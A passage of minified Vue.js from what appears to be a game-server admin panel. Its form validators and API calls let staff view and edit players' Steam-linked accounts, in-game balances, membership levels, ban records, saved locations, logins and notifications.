Error("请输入用户昵称"))}}],email:[{required:!0,trigger:"change",message:"请输入email",validator:function(e,t,i){/^\w+([-+.]\w+)*@\w+([-.]\w+)*\.\w+([-.]\w+)*$/.test(t)?i():i(new Error("请输入正确的email"))}}],phone:[{required:!0,trigger:"change",message:"请输入正确的手机号(例如: +85222345678, +8613123456789)",validator:function(e,t,i){var a=/^1[3-9]\d{9}$/.test(t),n=Object(U.phone)(t);t&&t.length&&(a||n.isValid)?i():i(new Error("请输入正确的手机号(例如: +85222345678, +8613123456789)"))}}],steamId:[{required:!0,trigger:"change",message:"请输入Steam ID",validator:function(e,t,i){null!==t&&D(t)&&17===t.length?i():i(new Error("请输入正确的Steam ID"))}}],status:[{required:!0,trigger:"change",message:"请选择账号状态",validator:function(e,t,i){!t||"normal"!==t&&"frozen"!==t?i(new Error("请选择账号状态")):i()}}],hasBoughtWelcomepack:[{required:!0,trigger:"change",message:"请输入是否已经购买新手套餐",validator:function(e,t,i){!0===t||!1===t?i():i(new Error("请输入是否已经购买新手套餐"))}}],buyWelcomeDidiCarTime:[{required:!0,trigger:"change",message:"请输入购买新手滴滴车次数",validator:function(e,t,i){"number"==typeof t?i():i(new Error("请输入购买新手滴滴车次数"))}}]},userDollarRules:{dollars:[{required:!0,trigger:"change",message:"请输入用户美金",validator:function(e,t,i){"number"==typeof t&&t>=0?i():i(new Error("请输入用户美金"))}}],chargeDollars:[{required:!0,trigger:"change",message:"请输入用户等级积分",validator:function(e,t,i){"number"==typeof t&&t>=0?i():i(new Error("请输入用户等级积分"))}}],level:[{required:!0,trigger:"change",message:"请选择会员等级",validator:function(t,i,a){e.levelList&&e.levelList.length&&void 0!==e.levelList.find((function(e){return e===i}))?a():a(new Error("请选择会员等级"))}}]}}},watch:{userId:{immediate:!0,handler:function(e){var t=this;this.currentExpandedUserId=e,e&&this.$nextTick((function(){t.loadAll()}))}}},methods:{loadAll:function(){this.loadUserInfo(),this.loadUserScumBanList(),this.loadUserDollar(),this.loadUserNewGift(),this.reloadUserAchieveGiftList(),this.loadUserLocations(),this.loadUserMonitors(),this.reloadUserDollarChangeList(),this.reloadUserLoginList(),this.reloadUserNotificationList()},onChangeUserScumBanListPagination:function(e){var t=this;this.currentUserScumBan.userScumBanListPagination.pageNum=e,this.$nextTick((function(){t.loadUserScumBanList()}))},onShowSizeChangeUserScumBanListPagination:function(e,t){var i=this;this.currentUserScumBan.userScumBanListPagination.pageNum=1,this.currentUserScumBan.userScumBanListPagination.pageSize=t,this.$nextTick((function(){i.loadUserScumBanList()}))},clearAndReloadUserScumBanList:function(){var e=this;this.currentUserScumBan.userScumBanListPagination.pageNum=1,this.currentUserScumBan.userScumBanListPagination.pageSize=10,this.$nextTick((function(){e.loadUserScumBanList()}))},loadUserScumBanList:function(){var e=this;return Object(o.a)(regeneratorRuntime.mark((function t(){var i,a,n,r,o,l,c,d,u;return regeneratorRuntime.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:return i=e.currentUserScumBan.userScumBanListPagination,a=i.pageNum,n=i.pageSize,r={userId:e.currentExpandedUserId,pageNum:a,pageSize:n},e.currentUserScumBan.loading=!0,t.prev=3,t.next=6,f({method:"GET",url:"/scumBan/listAllScumBan",params:r});case 6:o=t.sent,e.currentUserScumBan.loading=!1,200===o.status&&(e.currentUserScumBan.userScumBanListPagination.total=o.data.count,e.currentUserScumBan.userScumBanList=o.data.list),t.next=15;break;case 11:t.prev=11,t.t0=t.catch(3),console.error(t.t0),e.currentUserScumBan.loading=!1;case 15:return l={steamId:e.userSteamId},t.prev=16,t.next=19,f({method:"GET",url:"/userAdminSys/getSteamInfo",params:l});case 19:c=t.sent,e.currentUserScumBan.loading=!1,200===c.status?void 0!==(null==c||null===(d=c.data)||void 0===d?void 0:d.results)?e.currentUserScumBan.steamInfo=Object(s.a)(Object(s.a)({},null==c||null===(u=c.data)||void 0===u?void 0:u.results),{},{status:null}):e.currentUserScumBan.steamInfo.status=null==c?void 0:c.msg:e.$message.error(c.message),t.next=28;break;case 24:t.prev=24,t.t1=t.catch(16),console.error(t.t1),e.currentUserScumBan.loading=!1;case 28:case"end":return t.stop()}}),t,null,[[3,11],[16,24]])})))()},loadUserInfo:function(){var e=this;return Object(o.a)(regeneratorRuntime.mark((function t(){var i,a,n,o,s,l;return regeneratorRuntime.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:return e.$set(e.currentUserInfo,"loading",!0),t.prev=1,t.next=4,f({method:"GET",url:"/userAdminSys/infoUser",params:{userId:e.currentExpandedUserId}});case 4:if(i=t.sent,e.$set(e.currentUserInfo,"loading",!1),a=i.data,a.id,a.userId,a.createdTimeStamp,a.userDollar,a.lastCheckInTimeStamp,n=a.configs,o=Object(r.a)(a,ne),200===i.status){if(void 0!==e.thirdPartyRobotUidConfigs&&null!==(s=Object.keys(e.thirdPartyRobotUidConfigs))&&void 0!==s&&s.length)for(l in o.configs={},e.thirdPartyRobotUidConfigs)null!=n&&void 0!==n[e.thirdPartyRobotUidConfigs[l].key]?o.configs[e.thirdPartyRobotUidConfigs[l].key]=n[e.thirdPartyRobotUidConfigs[l].key]:o.configs[e.thirdPartyRobotUidConfigs[l].key]="number"===e.thirdPartyRobotUidConfigs[l].type?0:"";e.$set(e.currentUserInfo,"form",Object(A.cloneDeep)(o)),e.$set(e.currentUserInfo,"editForm",Object(A.cloneDeep)(o))}t.next=14;break;case 10:t.prev=10,t.t0=t.catch(1),console.error(t.t0),e.$set(e.currentUserInfo,"loading",!1);case 14:case"end":return t.stop()}}),t,null,[[1,10]])})))()},editUserInfo:function(){this.$set(this.currentUserInfo,"edit",!0)},saveUserInfo:function(){var e=this;this.$refs.userInfoForm.validate(function(){var t=Object(o.a)(regeneratorRuntime.mark((function t(i){var a,n;return regeneratorRuntime.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:if(!i){t.next=16;break}return e.$set(e.currentUserInfo,"saveLoading",!0),(a=e.currentUserInfo.editForm).phone.startsWith("+")||(a.phone="+86"+a.phone),t.prev=4,t.next=7,f({method:"PUT",url:"/userAdminSys/updateUser",data:Object(s.a)({userId:e.currentExpandedUserId},a)});case 7:n=t.sent,e.$set(e.currentUserInfo,"saveLoading",!1),200===n.status?(e.$message.success("修改成功"),e.$set(e.currentUserInfo,"edit",!1),e.loadUserInfo()):(console.log("错误",n),e.$message.error(n.msg)),t.next=16;break;case 12:t.prev=12,t.t0=t.catch(4),console.error(t.t0),e.$set(e.currentUserInfo,"saveLoading",!1);case 16:case"end":return t.stop()}}),t,null,[[4,12]])})));return function(e){return t.apply(this,arguments)}}())},cleanEditUserInfo:function(){this.$set(this.currentUserInfo,"edit",!1),this.$set(this.currentUserInfo,"editForm",Object(A.cloneDeep)(this.currentUserInfo.form))},clearUserPassword:function(){var e=this;return Object(o.a)(regeneratorRuntime.mark((function t(){var i;return regeneratorRuntime.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:return e.$set(e.currentUserPassword,"saveLoading",!0),t.prev=1,t.next=4,f({method:"PUT",url:"/userAdminSys/clearUserPassword",data:{userId:e.currentExpandedUserId}});case 4:i=t.sent,e.$set(e.currentUserPassword,"saveLoading",!1),200===i.status?e.$message.success("密码重置成功"):(console.log("错误",i),e.$message.error(i.msg)),t.next=13;break;case 9:t.prev=9,t.t0=t.catch(1),console.error(t.t0),e.$set(e.currentUserPassword,"saveLoading",!1);case 13:case"end":return t.stop()}}),t,null,[[1,9]])})))()},loadUserDollar:function(){var e=this;return Object(o.a)(regeneratorRuntime.mark((function t(){var i,a,n,o,s,l;return regeneratorRuntime.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:return e.$set(e.currentUserDollar,"loading",!0),t.prev=1,t.next=4,f({method:"GET",url:"/userAdminSys/infoUser",params:{userId:e.currentExpandedUserId}});case 4:i=t.sent,e.$set(e.currentUserDollar,"loading",!1),a=i.data.userDollar,a.id,a.userId,n=a.dollars,o=a.levelExpireTimeStamp,s=a.militaryLevelExpireTimeStamp,a.updateTimeStamp,(l=Object(r.a)(a,re)).dollars=Number(n.toFixed(2)),l.type="absolute",l.relativeType="plus",l.levelExpireTimeStamp=o?R()(parseInt(o)):null,l.militaryLevelExpireTimeStamp=s?R()(parseInt(s)):null,l.relative=0,200===i.status&&(e.$set(e.currentUserDollar,"form",Object(A.cloneDeep)(l)),e.$set(e.currentUserDollar,"editForm",Object(A.cloneDeep)(l))),t.next=20;break;case 16:t.prev=16,t.t0=t.catch(1),console.error(t.t0),e.$set(e.currentUserDollar,"loading",!1);case 20:case"end":return t.stop()}}),t,null,[[1,16]])})))()},editUserDollar:function(){this.$set(this.currentUserDollar,"edit",!0)},saveUserDollar:function(){var e=this;this.$refs.userDollarForm.validate(function(){var t=Object(o.a)(regeneratorRuntime.mark((function t(i){var a,n;return regeneratorRuntime.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:if(!i){t.next=22;break}return e.$set(e.currentUserDollar,"saveLoading",!0),t.prev=2,void 0!==(a=Object(A.cloneDeep)(e.currentUserDollar.editForm)).level&&e.levelDetailList[a.level]&&e.levelDetailList[e.levelDetailList.findIndex((function(e){return e.level===a.level}))].enableGesture||delete a.gesture,a.levelExpireTimeStamp&&(a.levelExpireTimeStamp=R()(a.levelExpireTimeStamp).valueOf()),a.militaryLevelExpireTimeStamp&&(a.militaryLevelExpireTimeStamp=R()(a.militaryLevelExpireTimeStamp).valueOf()),a.dollars="absolute"===a.type?a.dollars:a.dollars+a.relative*("plus"===a.relativeType?1:-1),delete a.type,delete a.relative,delete a.relativeType,t.next=13,f({method:"PUT",url:"/userAdminSys/updateUserDollar",data:Object(s.a)({userId:e.currentExpandedUserId},a)});case 13:n=t.sent,e.$set(e.currentUserDollar,"saveLoading",!1),200===n.status?(e.$message.success("修改成功"),e.$set(e.currentUserDollar,"edit",!1),e.loadUserDollar()):(console.log("错误",n),e.$message.error(n.msg)),t.next=22;break;case 18:t.prev=18,t.t0=t.catch(2),console.error(t.t0),e.$set(e.currentUserDollar,"saveLoading",!1);case 22:case"end":return t.stop()}}),t,null,[[2,18]])})));return function(e){return t.apply(this,arguments)}}())},cleanEditUserDollar:function(){this.$set(this.currentUserDollar,"edit",!1),this.$set(this.currentUserDollar,"editForm",Object(A.cloneDeep)(this.currentUserDollar.form))},loadUserNewGift:function(){var e=this;return Object(o.a)(regeneratorRuntime.mark((function t(){var i;return regeneratorRuntime.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:return e.$set(e.currentUserNewGift,"loading",!0),t.prev=1,t.next=4,f({method:"GET",url:"/userAdminSys/infoUserNewGift",params:{userId:e.currentExpandedUserId}});case 4:i=t.sent,e.$set(e.currentUserNewGift,"loading",!1),200===i.status&&(e.$set(e.currentUserNewGift,"fromTimeStamp",i.data.details.fromTimeStamp),e.$set(e.currentUserNewGift,"currentUserNewGiftList",i.data.details.schedules)),t.next=13;break;case 9:t.prev=9,t.t0=t.catch(1),console.error(t.t0),e.$set(e.currentUserLocations,"loading",!1);case 13:case"end":return t.stop()}}),t,null,[[1,9]])})))()},resetUserNewGift:function(){var e=this;return Object(o.a)(regeneratorRuntime.mark((function t(){var i;return regeneratorRuntime.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:return t.prev=0,t.next=3,f({method:"PUT",url:"/userAdminSys/resetUserNewGift",data:{userId:e.currentExpandedUserId}});case 3:200===(i=t.sent).status?(e.$message.success("重置成功"),e.loadUserNewGift()):(console.log("错误",i),e.$message.error(i.msg)),t.next=10;break;case 7:t.prev=7,t.t0=t.catch(0),console.error(t.t0);case 10:case"end":return t.stop()}}),t,null,[[0,7]])})))()},updateUserNewGift:function(e,t){var i=this;return Object(o.a)(regeneratorRuntime.mark((function a(){var n;return regeneratorRuntime.wrap((function(a){for(;;)switch(a.prev=a.next){case 0:return console.log(e),a.prev=1,a.next=4,f({method:"PUT",url:"/userAdminSys/updateUserNewGift",data:{userId:i.currentExpandedUserId,day:e+1,status:t}});case 4:200===(n=a.sent).status?(i.$message.success("更新成功"),i.loadUserNewGift()):(console.log("错误",n),i.$message.error(n.msg)),a.next=11;break;case 8:a.prev=8,a.t0=a.catch(1),console.error(a.t0);case 11:case"end":return a.stop()}}),a,null,[[1,8]])})))()},onChangeUserAchieveGiftListPagination:function(e){var t=this;this.currentUserAchieveGift.userAchieveGiftListPagination.pageNum=e,this.$nextTick((function(){t.reloadUserAchieveGiftList()}))},onShowSizeChangeUserAchieveGiftListPagination:function(e,t){var i=this;this.currentUserAchieveGift.userAchieveGiftListPagination.pageNum=1,this.currentUserAchieveGift.userAchieveGiftListPagination.pageSize=t,this.$nextTick((function(){i.reloadUserAchieveGiftList()}))},clearAndReloadUserAchieveGiftList:function(){var e=this;this.currentUserAchieveGift.userAchieveGiftListPagination.pageNum=1,this.currentUserAchieveGift.userAchieveGiftListPagination.pageSize=10,this.$nextTick((function(){e.reloadUserAchieveGiftList()}))},reloadUserAchieveGiftList:function(){var e=this;return Object(o.a)(regeneratorRuntime.mark((function t(){var i,a,n,r,o;return regeneratorRuntime.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:return i=e.currentUserAchieveGift.userAchieveGiftListPagination,a=i.pageNum,n=i.pageSize,r={userId:e.currentExpandedUserId,pageNum:a,pageSize:n},e.currentUserAchieveGift.loading=!0,t.prev=3,t.next=6,f({method:"GET",url:"/userAdminSys/listUserAchieveGift",params:r});case 6:o=t.sent,e.currentUserAchieveGift.loading=!1,200===o.status&&(e.currentUserAchieveGift.userAchieveGiftListPagination.total=o.data.count,e.currentUserAchieveGift.userAchieveGiftList=o.data.list),t.next=15;break;case 11:t.prev=11,t.t0=t.catch(3),console.error(t.t0),e.currentUserAchieveGift.loading=!1;case 15:case"end":return t.stop()}}),t,null,[[3,11]])})))()},deleteUserAchieveGift:function(e){var t=this;return Object(o.a)(regeneratorRuntime.mark((function i(){var a;return regeneratorRuntime.wrap((function(i){for(;;)switch(i.prev=i.next){case 0:return console.log(e),i.prev=1,i.next=4,f({method:"DELETE",url:"/userAdminSys/deleteUserAchieveGift",params:{userId:t.currentExpandedUserId,id:t.currentUserAchieveGift.userAchieveGiftList[e].id}});case 4:200===(a=i.sent).status?(t.$message.success("删除成功"),t.reloadUserAchieveGiftList()):(console.log("错误",a),t.$message.error(a.msg)),i.next=11;break;case 8:i.prev=8,i.t0=i.catch(1),console.error(i.t0);case 11:case"end":return i.stop()}}),i,null,[[1,8]])})))()},cleanUserAchieveGiftByUser:function(){var e=this;return Object(o.a)(regeneratorRuntime.mark((function t(){var i;return regeneratorRuntime.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:return t.prev=0,t.next=3,f({method:"DELETE",url:"/userAdminSys/cleanUserAchieveGiftByUser",params:{userId:e.currentExpandedUserId}});case 3:200===(i=t.sent).status?(e.$message.success("清空成功"),e.reloadUserAchieveGiftList()):(console.log("错误",i),e.$message.error(i.msg)),t.next=10;break;case 7:t.prev=7,t.t0=t.catch(0),console.error(t.t0);case 10:case"end":return t.stop()}}),t,null,[[0,7]])})))()},loadUserLocations:function(){var e=this;return Object(o.a)(regeneratorRuntime.mark((function t(){var i;return regeneratorRuntime.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:return e.$set(e.currentUserLocations,"loading",!0),t.prev=1,t.next=4,f({method:"GET",url:"/userAdminSys/infoUserLocations",params:{pageNum:1,pageSize:99999,userId:e.currentExpandedUserId}});case 4:i=t.sent,e.$set(e.currentUserLocations,"loading",!1),200===i.status&&e.$set(e.currentUserLocations,"userLocationsList",i.data.list.map((function(e){var t={};if(e.configs)try{t=JSON.parse(e.configs)}catch(e){t={price:null,purchaseLimitOn:!1,time:0,each:""}}else t={price:null,purchaseLimitOn:!1,time:0,each:""};return e.configs=t,e}))),t.next=13;break;case 9:t.prev=9,t.t0=t.catch(1),console.error(t.t0),e.$set(e.currentUserLocations,"loading",!1);case 13:case"end":return t.stop()}}),t,null,[[1,9]])})))()},editNewUserLocations:function(){this.$set(this.currentUserLocations,"editor",{show:!0,saveLoading:!1,new:!0,index:-1,id:null,data:{locations:"",description:"",configs:{price:null,purchaseLimitOn:!1,time:0,each:""}}})},editUserLocations:function(e){this.$set(this.currentUserLocations,"editor",{show:!0,saveLoading:!1,new:!1,index:e,id:this.currentUserLocations.userLocationsList[e].id,data:{locations:this.currentUserLocations.userLocationsList[e].locations,description:this.currentUserLocations.userLocationsList[e].description,configs:this.currentUserLocations.userLocationsList[e].configs}})},cleanUserLocationsEditor:function(){this.$set(this.currentUserLocations,"editor",{show:!1,saveLoading:!1,new:null,index:null,id:null,data:{locations:null,description:null,configs:{price:null,purchaseLimitOn:!1,time:0,each:""}}})},submitUserLocations:function(){var e=this;return Object(o.a)(regeneratorRuntime.mark((function t(){var i,a,n;return regeneratorRuntime.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:if((i=e.currentUserLocations.editor).data.locations&&i.data.locations.length&&3===i.data.locations.split(" ").length&&void 0===i.data.locations.split(" ").find((function(e){return!D(e)}))){t.next=4;break}return e.$message.error("坐标不能为空，且应为以空格隔开的三个数字"),t.abrupt("return");case 4:if(i.data.configs.purchaseLimitOn&&i.data.configs.time&&i.data.configs.each&&i.data.configs.each.length||!i.data.configs.purchaseLimitOn){t.next=7;break}return e.$message.error("启用购买限制时限制周期不能为空"),t.abrupt("return");case 7:return e.$set(e.currentUserLocations.editor,"saveLoading",!0),t.prev=8,(a={}).userId=e.currentExpandedUserId,!1===i.new&&i.id&&-1!==i.index&&(a.id=i.id),a.locations=i.data.locations,a.description=i.data.description,i.each=i.purchaseLimitOn?i.each:"",i.time=i.purchaseLimitOn?i.time:null,a.configs=JSON.stringify(i.data.configs),t.next=19,f({method:i.new?"POST":"PUT",url:i.new?"/userAdminSys/addUserLocations":"/userAdminSys/updateUserLocations",data:a});case 19:n=t.sent,e.$set(e.currentUserLocations.editor,"saveLoading",!1),200===n.status?(e.$message.success(i.new?"添加成功":"修改成功"),e.$set(e.currentUserLocations,"editor",{show:!1,saveLoading:!1,new:null,index:null,id:null,data:{locations:null,description:null,configs:{price:null,purchaseLimitOn:!1,time:0,each:""}}}),e.loadUserLocations()):(console.log("错误",n),e.$message.error(n.msg)),t.next=28;break;case 24:t.prev=24,t.t0=t.catch(8),console.error(t.t0),e.$set(e.currentUserLocations.editor,"saveLoading",!1);case 28:case"end":return t.stop()}}),t,null,[[8,24]])})))()},deleteUserLocations:function(e){var t=this;return Object(o.a)(regeneratorRuntime.mark((function i(){var a;return regeneratorRuntime.wrap((function(i){for(;;)switch(i.prev=i.next){case 0:return console.log(e),i.prev=1,i.next=4,f({method:"DELETE",url:"/userAdminSys/deleteUserLocations",params:{userId:t.currentExpandedUserId,id:t.currentUserLocations.userLocationsList[e].id}});case 4:200===(a=i.sent).status?(t.$message.success("删除成功"),t.loadUserLocations()):(console.log("错误",a),t.$message.error(a.msg)),i.next=11;break;case 8:i.prev=8,i.t0=i.catch(1),console.error(i.t0);case 11:case"end":return i.stop()}}),i,null,[[1,8]])})))()},loadUserMonitors:function(){var e=this;return Object(o.a)(regeneratorRuntime.mark((function t(){var i;return regeneratorRuntime.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:return e.$set(e.currentUserMonitors,"loading",!0),t.prev=1,t.next=4,f({method:"GET",url:"/userAdminSys/infoUserMonitors",params:{pageNum:1,pageSize:99999,userId:e.currentExpandedUserId}});case 4:i=t.sent,e.$set(e.currentUserMonitors,"loading",!1),200===i.status&&e.$set(e.currentUserMonitors,"userMonitorsList",i.data.list.map((function(e){var t={};if(e.configs)try{t=JSON.parse(e.configs)}catch(e){t={price:null,purchaseLimitOn:!1,time:0,each:""}}else t={price:null,purchaseLimitOn:!1,time:0,each:""};return e.configs=t,e}))),t.next=13;break;case 9:t.prev=9,t.t0=t.catch(1),console.error(t.t0),e.$set(e.currentUserMonitors,"loading",!1);case 13:case"end":return t.stop()}}),t,null,[[1,9]])})))()},editNewUserMonitors:function(){this.$set(this.currentUserMonitors,"editor",{show:!0,saveLoading:!1,new:!0,index:-1,id:null,data:{locations:"",description:"",configs:{price:null,purchaseLimitOn:!1,time:0,each:""}}})},editUserMonitors:function(e){this.$set(this.currentUserMonitors,"editor",{show:!0,saveLoading:!1,new:!1,index:e,id:this.currentUserMonitors.userMonitorsList[e].id,data:{locations:this.currentUserMonitors.userMonitorsList[e].locations,description:this.currentUserMonitors.userMonitorsList[e].description,configs:this.currentUserMonitors.userMonitorsList[e].configs}})},cleanUserMonitorsEditor:function(){this.$set(this.currentUserMonitors,"editor",{show:!1,saveLoading:!1,new:null,index:null,id:null,data:{locations:null,description:null,configs:{price:null,purchaseLimitOn:!1,time:0,each:""}}})},submitUserMonitors:function(){var e=this;return Object(o.a)(regeneratorRuntime.mark((function t(){var i,a,n;return regeneratorRuntime.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:if((i=e.currentUserMonitors.editor).data.locations&&i.data.locations.length&&3===i.data.locations.split(" ").length&&void 0===i.data.locations.split(" ").find((function(e){return!D(e)}))){t.next=4;break}return e.$message.error("坐标不能为空，且应为以空格隔开的三个数字"),t.abrupt("return");case 4:if(i.data.configs.purchaseLimitOn&&i.data.configs.time&&i.data.configs.each&&i.data.configs.each.length||!i.data.configs.purchaseLimitOn){t.next=7;break}return e.$message.error("启用购买限制时限制周期不能为空"),t.abrupt("return");case 7:return e.$set(e.currentUserMonitors.editor,"saveLoading",!0),t.prev=8,(a={}).userId=e.currentExpandedUserId,!1===i.new&&i.id&&-1!==i.index&&(a.id=i.id),a.locations=i.data.locations,a.description=i.data.description,i.each=i.purchaseLimitOn?i.each:"",i.time=i.purchaseLimitOn?i.time:null,a.configs=JSON.stringify(i.data.configs),t.next=19,f({method:i.new?"POST":"PUT",url:i.new?"/userAdminSys/addUserMonitors":"/userAdminSys/updateUserMonitors",data:a});case 19:n=t.sent,e.$set(e.currentUserMonitors.editor,"saveLoading",!1),200===n.status?(e.$message.success(i.new?"添加成功":"修改成功"),e.$set(e.currentUserMonitors,"editor",{show:!1,saveLoading:!1,new:null,index:null,id:null,data:{locations:null,description:null,configs:{price:null,purchaseLimitOn:!1,time:0,each:""}}}),e.loadUserMonitors()):(console.log("错误",n),e.$message.error(n.msg)),t.next=28;break;case 24:t.prev=24,t.t0=t.catch(8),console.error(t.t0),e.$set(e.currentUserMonitors.editor,"saveLoading",!1);case 28:case"end":return t.stop()}}),t,null,[[8,24]])})))()},deleteUserMonitors:function(e){var t=this;return Object(o.a)(regeneratorRuntime.mark((function i(){var a;return regeneratorRuntime.wrap((function(i){for(;;)switch(i.prev=i.next){case 0:return console.log(e),i.prev=1,i.next=4,f({method:"DELETE",url:"/userAdminSys/deleteUserMonitors",params:{userId:t.currentExpandedUserId,id:t.currentUserMonitors.userMonitorsList[e].id}});case 4:200===(a=i.sent).status?(t.$message.success("删除成功"),t.loadUserMonitors()):(console.log("错误",a),t.$message.error(a.msg)),i.next=11;break;case 8:i.prev=8,i.t0=i.catch(1),console.error(i.t0);case 11:case"end":return i.stop()}}),i,null,[[1,8]])})))()},onChangeUserDollarChangeListPagination:function(e){var t=this;this.currentUserDollarChange.userDollarChangeListPagination.pageNum=e,this.$nextTick((function(){t.reloadUserDollarChangeList()}))},onShowSizeChangeUserDollarChangeListPagination:function(e,t){var i=this;this.currentUserDollarChange.userDollarChangeListPagination.pageNum=1,this.currentUserDollarChange.userDollarChangeListPagination.pageSize=t,this.$nextTick((function(){i.reloadUserDollarChangeList()}))},clearAndReloadUserDollarChangeList:function(){var e=this;this.currentUserDollarChange.userDollarChangeListPagination.pageNum=1,this.currentUserDollarChange.userDollarChangeListPagination.pageSize=10,this.$nextTick((function(){e.reloadUserDollarChangeList()}))},reloadUserDollarChangeList:function(){var e=this;return Object(o.a)(regeneratorRuntime.mark((function t(){var i,a,n,r,o;return regeneratorRuntime.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:return i=e.currentUserDollarChange.userDollarChangeListPagination,a=i.pageNum,n=i.pageSize,r={userId:e.currentExpandedUserId,pageNum:a,pageSize:n},e.currentUserDollarChange.loading=!0,t.prev=3,t.next=6,f({method:"GET",url:"/userDollarChangeAdminSys/listByUser",params:r});case 6:o=t.sent,e.currentUserDollarChange.loading=!1,200===o.status&&(e.currentUserDollarChange.userDollarChangeListPagination.total=o.data.count,e.currentUserDollarChange.userDollarChangeList=o.data.list),t.next=15;break;case 11:t.prev=11,t.t0=t.catch(3),console.error(t.t0),e.currentUserDollarChange.loading=!1;case 15:case"end":return t.stop()}}),t,null,[[3,11]])})))()},onChangeUserLoginListPagination:function(e){var t=this;this.currentUserLogin.userLoginListPagination.pageNum=e,this.$nextTick((function(){t.reloadUserLoginList()}))},onShowSizeChangeUserLoginListPagination:function(e,t){var i=this;this.currentUserLogin.userLoginListPagination.pageNum=1,this.currentUserLogin.userLoginListPagination.pageSize=t,this.$nextTick((function(){i.reloadUserLoginList()}))},clearAndReloadUserLoginList:function(){var e=this;this.currentUserLogin.userLoginListPagination.pageNum=1,this.currentUserLogin.userLoginListPagination.pageSize=10,this.$nextTick((function(){e.reloadUserLoginList()}))},reloadUserLoginList:function(){var e=this;return Object(o.a)(regeneratorRuntime.mark((function t(){var i,a,n,r,o;return regeneratorRuntime.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:return i=e.currentUserLogin.userLoginListPagination,a=i.pageNum,n=i.pageSize,r={userId:e.currentExpandedUserId,pageNum:a,pageSize:n},e.currentUserLogin.loading=!0,t.prev=3,t.next=6,f({method:"GET",url:"/userAdminSys/infoUserLogin",params:r});case 6:o=t.sent,e.currentUserLogin.loading=!1,200===o.status&&(e.currentUserLogin.userLoginListPagination.total=o.data.count,e.currentUserLogin.currentUserLoginList=o.data.list),t.next=15;break;case 11:t.prev=11,t.t0=t.catch(3),console.error(t.t0),e.currentUserLogin.loading=!1;case 15:case"end":return t.stop()}}),t,null,[[3,11]])})))()},onChangeUserNotificationListPagination:function(e){var t=this;this.currentUserNotification.userNotificationListPagination.pageNum=e,this.$nextTick((function(){t.reloadUserNotificationList()}))},onShowSizeChangeUserNotificationListPagination:function(e,t){var i=this;this.currentUserNotification.userNotificationListPagination.pageNum=1,this.currentUserNotification.userNotificationListPagination.pageSize=t,this.$nextTick((function(){i.reloadUserNotificationList()}))},clearAndReloadUserNotificationList:function(){var e=this;this.currentUserNotification.userNotificationListPagination.pageNum=1,this.currentUserNotification.userNotificationListPagination.pageSize=10,this.$nextTick((function(){e.reloadUserNotificationList()}))},reloadUserNotificationList:function(){var e=this;return Object(o.a)(regeneratorRuntime.mark((function t(){var i,a,n,r,o;return regeneratorRuntime.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:return i=e.currentUserNotification.userNotificationListPagination,a=i.pageNum,n=i.pageSize,r={userId:e.currentExpandedUserId,pageNum:a,pageSize:n},e.currentUserNotification.loading=!0,t.prev=3,t.next=6,f({method:"GET",url:"/userAdminSys/listUserNotification",params:r});case 6:o=t.sent,e.currentUserNotification.loading=!1,200===o.status&&(e.currentUserNotification.userNotificationListPagination.total=o.data.count,e.currentUserNotification.currentUserNotificationList=o.data.list),t.next=15;break;case 11:t.prev=11,t.t0=t.catch(3),console.error(t.t0),e.currentUserNotification.loading=!1;case 15:case"end":return t.stop()}}),t,null,[[3,11]])})))()},updateUserNotification:function(e,t){var i=this;return Object(o.a)(regeneratorRuntime.mark((function a(){var n;return regeneratorRuntime.wrap((function(a){for(;;)switch(a.prev=a.next){case 0:return a.prev=0,a.next=3,f({method:"PUT",url:"/userAdminSys/updateUserNotification",data:{id:e,status:t}});case 3:200===(n=a.sent).status?(i.$message.success("修改成功"),i.reloadUserNotificationList()):(console.log("错误",n),i.$message.error(n.msg)),a.next=10;break;case 7:a.prev=7,a.t0=a.catch(0),console.error(a.t0);case 10:case"end":return a.stop()}}),a,null,[[0,7]])})))()},doCopyContent:function(e){var t=this;this.$copyText(e).then((function(e){t.$message.success("已复制到剪贴板")}),(function(e){t.$message.error("复制失败"),console.log("复制失败：",e)}))},deleteUserNotification:function(e){var t=this;return Object(o.a)(regeneratorRuntime.mark((function i(){var a;return regeneratorRuntime.wrap((function(i){for(;;)switch(i.prev=i.next){case 0:return a={id:e},i.prev=1,i.next=4,f({method:"DELETE",url:"/userAdminSys/deleteUserNotification",params:a});case 4:200===i.sent.status&&(t.$message.success("操作成功"),t.reloadUserNotificationList()),i.next=11;break;case 8:i.prev=8,i.t0=i.catch(1),console.error(i.t0);case 11:case"end":return i.stop()}}),i,null,[[1,8]])})))()},cleanUserNotification:function(){var e=this;return Object(o.a)(regeneratorRuntime.mark((function t(){var i;return regeneratorRuntime.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:return i={userId:e.userId},t.prev=1,t.next=4,f({method:"DELETE",url:"/userAdminSys/deleteUserNotification",params:i});case 4:200===t.sent.status&&(e.$message.success("操作成功"),e.reloadUserNotificationList()),t.next=11;break;case 8:t.prev=8,t.t0=t.catch(1),console.error(t.t0);case 11:case"end":return t.stop()}}),t,null,[[1,8]])})))()}}},se=oe,le=Object(S.a)(se,(function(){var e=this,t=e.$createElement,i=e._self._c||t;return i("a-collapse",{style:{marginTop:e.readOnly?"10px":"0"},model:{value:e.currentExpandKey,callback:function(t){e.currentExpandKey=t},expression:"currentExpandKey"}},[i("a-collapse-panel",{key:"scum-ban"},[i("template",{slot:"header"},[i("span",{staticStyle:{"font-weight":"bolder"}},[e._v("玩家行为风险")]),!1===e.currentUserInfo.loading&&e.currentExpandKey&&void 0!==e.currentExpandKey.find((function(e){return"scum-ban"===e}))?[!1===e.currentUserDollarChange.loading?i("a-button",{staticStyle:{"margin-left":"10px"},attrs:{icon:"sync",size:"small"},nativeOn:{click:function(t){return 